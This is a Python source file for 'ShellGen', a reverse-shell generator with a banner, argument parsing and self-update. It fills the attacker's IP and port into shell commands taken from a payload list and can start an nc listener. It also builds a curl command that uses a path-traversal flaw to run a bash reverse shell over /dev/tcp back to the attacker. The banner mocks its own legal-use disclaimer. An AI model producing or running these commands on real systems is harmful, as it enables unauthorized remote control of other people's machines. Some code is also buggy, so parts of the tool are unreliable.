#! /usr/bin/env python3
# -*- coding: utf-8 -*-

# Reverse shell generator based on examples pulled from:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# This is uses the tun0 IPv4 address. Enter a specific port after calling the script

import sys
import os
import argparse
import subprocess
from time import sleep
from sys import argv
from os import path
from src.design import print_error, print_info, print_shell, print_shell_types, bcolors, print_list_shells
import re
#from src.core import return_shells

# Support between python2 and python3
try: input = raw_input
except: pass

# List of shells available
#shells = ["Fuck! Something isn't right :/"]

# funny random banner
import random
funny = random.sample(["Aliens", "Clowns", "Mr. Robot", "Zero Cool", "Goats", "Hackers", "Unicorns"], 1)[0]

def create_launcher():
	try:
		if os.geteuid() != 0:
			print("\nThis needs to be run as root. Please sudo it up! Exiting...")
			exit()
		print_info("Creating launcher...")
		"""
		Create a launcher to execute shellgen from the commandline.
		"""
		cwd = os.getcwd()
		filewrite = open("/usr/local/bin/shellgen", "w")
		filewrite.write('#!/bin/sh\ncd %s\nchmod +x shellgen\n./shellgen "$@"' % (cwd))
		filewrite.close()
		subprocess.Popen("chmod +x /usr/local/bin/shellgen", shell=True).wait()
		
		print_info("Launcher has been created.")
		print_info("Now you can run shellgen from anywhere in the terminal")
	except Exception as error:
		print_error(error)

# Grab the latest update
def update():
	# force https for git
	def git_https_force():
		subprocess.Popen('git config --global url."https://github.com/".insteadOf git@github.com:;git config --global url."https://".insteadOf git://', shell=True).wait()

	# force https
	git_https_force()

	# try to update ourself first
	print_info("Trying to update myself first... Then will generate the shellcode...")
	subprocess.Popen("git pull", shell=True).wait()
	print_info("Remember, if there was a new update, terminate this session and re-run the script\n")
	sleep(1)


def banner():
	__version__ = "1.2"

	banner = bcolors.DARKGREEN + """
	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
	██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
	███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
	╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
	███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
	╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
	""" + bcolors.ENDC

	banner += """
	Version: """ + bcolors.YELLOW + bcolors.BOLD + str(__version__) + bcolors.ENDC +\
	bcolors.DARKGREEN + """\n
	Author: The Joker (@__Th3J0k3r__) (github.com/thejoker3000)
	Website: https://thegibson.xyz"""

	banner += """
	Reverse shell generator.
	Generates a shellcode to remotley gain access to a machine you've compromised

	"""

	banner += "Welcome to ShellGen - where shells are generated... Because..." + bcolors.BOLD + bcolors.RED+ funny + bcolors.ENDC + "\n"

	banner += bcolors.RED + bcolors.BOLD + """
	!!!!!! DISCLAIMER !!!!!!
	This tool is developed only for legal purposes.
	Just kidding. Have fun! :-)
	""" + bcolors.ENDC
	
	return banner

def return_curl_shell():
	target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
	rport = input("Enter target port:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
	curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
	print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)

def return_shells(shell, ip, port):
	with open("src/shells.txt","r") as list_shells:
		shells = list_shells.readlines()
		count = 0
		for i in shells:
			desc, cmd = i.split("|", 1)
			cmd = cmd.replace("[IPADDR]", ip)
			cmd = cmd.replace("[PORT]", port)
			type_shell = cmd.split(" ")[0]
			type_shell = type_shell.lower()
			if shell == type_shell:
				count += 1
				print_shell_types(desc)
				print(cmd)
			elif shell == 'all':
				count += 1
				print_shell_types(desc)
				print(cmd)
		if count == 0:
			print("No shells were able to be returned since '" + shell + "' is not in the list")
			sys.exit()

def verify_ip(ip):
	# for validating an Ip-address 
	regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
		25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$'''

	# pass the regular expression 
	# and the string in search() method 
	if (re.search(regex, ip)):
		print(bcolors.BOLDGREEN + "[*] " + bcolors.ENDC + "IP address is valid")
	else:
		print(bcolors.BOLDRED + "[!] " + bcolors.ENDC + "Invalid Ip address. Please try again...")
		sys.exit()

def main():
	try:
		global update
		group = argparse.ArgumentParser()
		
		group.add_argument("-ip", "--lhost", help="Your IP or hostname")
		group.add_argument("-p", "--lport", "--port", help="The port to be used (default will be 4444)")
		group.add_argument("-s", "--shell", help="Type of reverse shell to use")
		group.add_argument("-u", "--update", help="When given this argument it will update and continue", action="store_true")
		group.add_argument("-ls", "--shells", help="Lists all available shells", action="store_true")
		group.add_argument("-c", "--create-launcher", help="Creates a launcher to run anywhere in terminal (REQUIRES SUDO) | Not required to use if you used trustedsec/ptf", action="store_true")
		group.add_argument("-l", "--start-listener", help="Start listener after generating a reverse shell", action="store_true")
		group.add_argument("--no-update", help="Skip the update", action="store_true")
		#group.add_argument("-m", "--manual", help="Read the manual for guidance (Shows README.md file)", action="store_true")
		
		args = group.parse_args()

		if args.update:
			update()
		
		if args.create_launcher:
			create_launcher()
			sys.exit()
		
		# Get the list of shells available
		if args.shells:
			listshells = []
			with open("src/shells.txt","r") as fshells:
				shellsx = fshells.readlines()
				for shell in shellsx:
					shell = shell.replace("\n","").split("|")[0].lower()
					if shell not in listshells:
						listshells.append(shell)
						print_shell(shell)
					else:
						pass

		if args.no_update:
			update = False
		else:
			update = True
		
		if args.lhost and args.lport and args.shell:
			verify_ip(args.lhost)
			port = args.lport
			ip = args.lhost
			shell = args.shell
			return_shells(shell, ip, port)
		elif args.lhost and args.lport and not args.shell:
			verify_ip(args.lhost)
			print_info("No shell was given so will display all shells available")
			ip = args.lhost
			port = args.lport
			shell = 'all'
			return_shells(shell, ip, port)
		elif args.lhost and args.shell and not args.lport:
			verify_ip(args.lhost)
			print_info("Port was not provided but will use the default port '4444'")
			port = '4444'
			ip = args.lhost
			shell = args.shell
			return_shells(shell, ip, port)
		else:
			os.system("shellgen --help --no-update")

			'''print_error("Something went wrong!")
			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Local Port: " + bcolors.BOLDRED + args.lport + bcolors.ENDC)
			except: print(bcolors.BOLD + bcolors.RED + "[!]" + bcolors.ENDC + " Port not given")
			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Local host: " + bcolors.BOLDRED + args.lhost + bcolors.ENDC)
			except: print(bcolors.BOLDRED + "[!]" + bcolors.ENDC + " Local IP not given")
			try: print(bcolors.BOLDGREEN + "[i] " + bcolors.ENDC + "Type of shell: " + bcolors.BOLDRED + args.shell + bcolors.ENDC)
			except: print(bcolors.BOLDRED + "[!]" + bcolors.ENDC + " Shell not given")'''


		if args.start_listener:
			if not args.lport:
				print_info("Make sure you gave me the port to listen on.")
				sys.exit()
			print_info("Starting listener on port %s" %str(args.lport))
			os.system('nc -lnvp {}'.format(port))
	
	except KeyboardInterrupt:
		print()
		print_error("Aborting all cyber operations")
		sys.exit()
	except IndexError as error1:
		print()
		print_error("Houston, we have a problem!")
		print(error1)
		print_error("Make sure you are connected to the VPN or have internet connection")
		sys.exit()



if __name__ == "__main__":
	try:
		secret_list = ["covid","covid19","covid-19"]
		if sys.argv[-1] in secret_list:
			print("COVID-19 happened back in 2019-2020 that killed thousands of people")
			print("The world since then has never been the same and never will")
			sys.exit()
		if not "--no-update" in sys.argv:
			update()
			os.system("clear")
			print(banner())
			main()
		else:
			os.system("clear")
			print(banner())
			main()

	except Exception as error:
		print(error)
